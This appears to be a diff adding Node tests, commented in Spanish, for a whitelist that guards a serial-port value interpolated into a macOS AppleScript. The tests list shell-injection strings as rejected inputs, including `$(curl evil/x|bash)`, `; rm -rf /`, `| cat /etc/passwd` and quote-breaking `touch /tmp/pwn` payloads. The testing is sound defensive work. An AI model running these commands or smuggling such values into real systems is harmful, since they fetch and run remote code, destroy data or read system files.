@@ -338,6 +338,103 @@ test("diagnostico en Windows (simulado): Get-CimInstance en UTF-8, y lee el CH34
   }
 })
 
+// ── monitor en macOS: whitelist del puerto antes de armar el AppleScript ──────
+//
+// `puerto` va interpolado en un string que Terminal.app corre en un shell
+// POSIX real: ese shell expande `$(...)` aunque este entre comillas dobles, asi
+// que un puerto como `$(curl evil/x|bash)` ejecuta codigo en la Mac del
+// docente. La defensa es una whitelist fail-closed (`puertoValido()`): sólo
+// puede RECHAZAR, nunca cambiar lo que se ejecuta cuando el puerto es valido —
+// por eso el primer test de este bloque compara el comando armado, byte por
+// byte, contra lo que armaba el codigo de antes del cambio.
+//
+// `process.platform` se pisa a "darwin" como ya hacen los tests de Windows en
+// el otro archivo (`platformio-pio.test.mjs`), y se restaura siempre en un
+// `finally` para no filtrarle la plataforma falsa a los tests que corren
+// despues (node --test comparte el módulo entero).
+
+function comoDarwin() {
+  return Object.defineProperty(process, "platform", { value: "darwin", configurable: true })
+}
+
+test("puertoValido(): acepta las formas reales de las tres plataformas", () => {
+  // Windows — detectPort() lee /COM\d+/g del stdout crudo cuando el JSON no parsea.
+  assert.equal(mod.puertoValido("COM3"), true)
+  assert.equal(mod.puertoValido("COM12"), true)
+  assert.equal(mod.puertoValido("com3"), true, "el driver no distingue mayusculas")
+  // Linux — mismo fallback, /dev/tty(USB|ACM)\d+.
+  assert.equal(mod.puertoValido("/dev/ttyUSB0"), true)
+  assert.equal(mod.puertoValido("/dev/ttyACM0"), true)
+  // macOS — lo que devuelve pyserial ahí: /dev/cu.* y /dev/tty.* con nombre de chip.
+  assert.equal(mod.puertoValido("/dev/cu.usbserial-14140"), true)
+  assert.equal(mod.puertoValido("/dev/tty.usbserial-14140"), true)
+  assert.equal(mod.puertoValido("/dev/cu.SLAB_USBtoUART"), true)
+  assert.equal(mod.puertoValido("/dev/cu.Bluetooth-Incoming-Port"), true)
+})
+
+test("puertoValido(): rechaza los vectores de inyeccion de shell", () => {
+  const vectores = [
+    "$(curl evil/x|bash)",
+    "/dev/ttyUSB0$(curl evil/x|bash)",
+    "`curl evil/x|bash`",
+    "/dev/ttyUSB0; rm -rf /",
+    "/dev/ttyUSB0 && rm -rf /",
+    "/dev/ttyUSB0 | cat /etc/passwd",
+    "/dev/ttyUSB0\nrm -rf /",
+    '/dev/ttyUSB0"; touch /tmp/pwn; echo "',
+    "/dev/ttyUSB0'; touch /tmp/pwn; echo '",
+    "/dev/ttyUSB0 & echo pwned",
+    "",
+    "cualquier cosa",
+  ]
+  for (const v of vectores) {
+    assert.equal(mod.puertoValido(v), false, `deberia rechazar: ${JSON.stringify(v)}`)
+  }
+})
+
+test("monitor en macOS con puerto valido: el AppleScript es BYTE POR BYTE el mismo de antes del cambio", async () => {
+  const original = comoDarwin()
+  try {
+    escenario()
+    const puerto = "/dev/cu.usbserial-14140"
+    const r = await mod.default.execute({ action: "monitor", port: puerto, baud: 115200 }, ctx)
+    assert.match(r, /Abri una ventana nueva/, "un puerto valido tiene que abrir el monitor, no rechazarlo")
+
+    const lanzado = spawns.find((s) => s.cmd[0] === "osascript")
+    assert.ok(lanzado, `no lanzo osascript: ${lanzados().join(" | ")}`)
+
+    // Reconstruccion INDEPENDIENTE de la logica de antes del cambio (mismas
+    // reglas que quoteIfNeeded + el armado del script): si esto no matchea,
+    // el fix cambio lo que se ejecuta para un puerto valido, y eso es
+    // exactamente lo que el criterio del usuario prohibe.
+    const pioPath = "pio" // sin PlatformIO instalado en el HOME falso del test
+    const shellCmdEsperado = `${pioPath} device monitor --port ${puerto} --baud 115200`
+    const scriptEsperado = `tell application "Terminal" to do script "${shellCmdEsperado}"`
+    assert.equal(lanzado.cmd[2], scriptEsperado)
+  } finally {
+    Object.defineProperty(process, "platform", original)
+  }
+})
+
+test("monitor en macOS con puerto malicioso: RECHAZA y no lanza osascript ni nada con 'curl'", async () => {
+  const original = comoDarwin()
+  try {
+    escenario()
+    const puerto = "$(curl evil/x|bash)"
+    const r = await mod.default.execute({ action: "monitor", port: puerto }, ctx)
+    assert.match(r, /No reconozco ese puerto/)
+    assert.match(r, /cu\.usbserial/, "tiene que decir que forma se esperaba")
+    assert.equal(indice("osascript"), -1, "no tiene que abrir ninguna terminal con un puerto invalido")
+    // Antes de llegar a "monitor", execute() ya corrio el pre-chequeo `pio --version`
+    // (linea ~841): ese es el UNICO spawn esperado. Nada mas se lanzo con el puerto
+    // malicioso adentro — en particular, ningun comando lleva "curl".
+    assert.equal(spawns.length, 1, `se lanzo algo de mas: ${lanzados().join(" | ")}`)
+    assert.ok(!lanzados().some((l) => l.includes("curl")), "el vector de inyeccion no debe llegar a ningun spawn")
+  } finally {
+    Object.defineProperty(process, "platform", original)
+  }
+})
+
 // ── recortarSalida (pura) ────────────────────────────────────────────────────
 
 test("recortarSalida: lo corto pasa entero, con o sin CRLF", () => {
